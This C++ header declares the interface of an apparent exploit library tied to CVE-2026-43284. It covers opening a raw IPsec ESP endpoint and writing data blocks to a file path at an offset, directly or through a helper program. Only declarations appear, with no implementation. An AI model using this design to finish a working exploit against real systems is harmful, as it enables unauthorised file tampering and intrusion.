#pragma once

#include <cstdint>
#include <sys/types.h>

namespace ghostlock::backend::cve_2026_43284::lib {

/** Connected ESP endpoint; owns sock until gl_esp_close. */
struct RawEspEndpoint {
    int sock = -1;
    std::uint32_t spi = 0;
};

struct RawEspWrite {
    const char *path = nullptr;
    off_t offset = 0;
    const std::uint8_t *iv = nullptr;
    std::uint32_t sequence = 0;
};

struct RawEspError {
    const char *stage = nullptr;
    int err = 0;
};

bool gl_esp_open(std::uint32_t spi, std::uint16_t encap_port, std::uint16_t sender_port,
                 RawEspEndpoint *out, RawEspError *error) noexcept;
bool gl_esp_write_block(const RawEspEndpoint &endpoint, const RawEspWrite &write,
                        RawEspError *error) noexcept;
bool gl_esp_write_block_via_helper(const RawEspEndpoint &endpoint, const RawEspWrite &write,
                                   const char *helper_path, RawEspError *error) noexcept;
void gl_esp_close(RawEspEndpoint *endpoint) noexcept;

}  // namespace ghostlock::backend::cve_2026_43284::lib
